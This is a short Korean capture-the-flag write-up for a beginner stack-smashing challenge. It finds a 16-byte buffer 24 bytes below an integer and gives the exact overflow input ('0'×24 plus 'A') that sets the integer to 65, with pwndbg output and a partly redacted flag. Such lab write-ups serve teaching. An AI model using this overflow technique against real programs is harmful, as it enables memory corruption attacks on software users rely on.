# Category

pwnable

# Overview

Smash the stack

# Analysis

- 코드와 어셈블리 코드를 비교해보면 `input`이 들어간 메모리 `0x7fffffffe200`과 `num`에 할당된 메모리 `0x7fffffffe218`를 알 수 있다.

  `input` 변수와 `num` 변수간의 메모리 차이는 `0x18(24)`바이트이기 때문에 25바이트부터의 값이 `num` 변수에 저장된다.

  ```c

  ...

    // 0x40123e <main+8>     sub    rsp, 0x20                     RSP => 0x7fffffffe200
    char input[16];
    // 0x401242 <main+12>    mov    dword ptr [rbp - 8], 0x40     [0x7fffffffe218] <= 0x40
    int num = 64;

  ...

  ```

- `input` 변수에 대한 길이 검증을 하지 않기 때문에, 16바이트를 넘기는 문자를 입력하게 되면 데이터가 다음 메모리로 밀리게 된다.

- num값을 65로 맞추게되면 flag 획득할 수 있다.

  ```c
  ...

    if( num == 65 ){
      printf("You win!\n");
      fflush(stdout);
      // Open file
      fptr = fopen("flag.txt", "r");

      ...

    }
  ```

# Exploitation

- `num`을 65로 바꾸기 위해 24바이트 글자 + ascii 코드값 A(65)를 입력하게되면 flag를 획득할 수 있다.

  ```log
  Enter a string: 000000000000000000000000A

  num is 65
  You win!
  ```

  ```log
  pwndbg> x/s 0x7fffffffe200
  0x7fffffffe200:	'0' <repeats 24 times>, "A"
  pwndbg> x/s 0x7fffffffe218
  0x7fffffffe218:	"A"
  ```

# Flag

`academy{l0...78}`
